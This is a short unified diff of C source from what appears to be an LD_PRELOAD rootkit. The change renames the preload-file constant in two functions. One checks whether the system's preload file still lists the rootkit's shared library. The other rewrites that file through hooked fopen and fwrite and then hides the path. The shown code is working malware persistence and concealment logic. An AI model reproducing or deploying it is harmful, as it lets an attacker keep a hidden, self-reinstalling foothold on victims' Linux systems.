@@ -31,7 +31,7 @@ int preload_inconsistent(void){ // returns 1 if something is wrong with the prel
 
     hook(C__XSTAT);
     memset(&preloadstat, 0, sizeof(stat));
-    statret = (long)call(C__XSTAT, _STAT_VER, LDSO_PRELOAD, &preloadstat);
+    statret = (long)call(C__XSTAT, _STAT_VER, PRELOAD_FILE, &preloadstat);
 
     if((statret < 0 && errno == ENOENT) || preloadstat.st_size != strlen(SOPATH))
         status = 1;
@@ -45,14 +45,14 @@ void reinstall(void){
     if(!preload_inconsistent()) return;
 
     hook(CFOPEN, CFWRITE);
-    FILE *ldfp = call(CFOPEN, LDSO_PRELOAD, "w");
+    FILE *ldfp = call(CFOPEN, PRELOAD_FILE, "w");
 
     if(ldfp != NULL){
         call(CFWRITE, SOPATH, strlen(SOPATH), 1, ldfp);
         fflush(ldfp);
         fclose(ldfp);
 
-        hide_path(LDSO_PRELOAD);
+        hide_path(PRELOAD_FILE);
     }
 
     return;
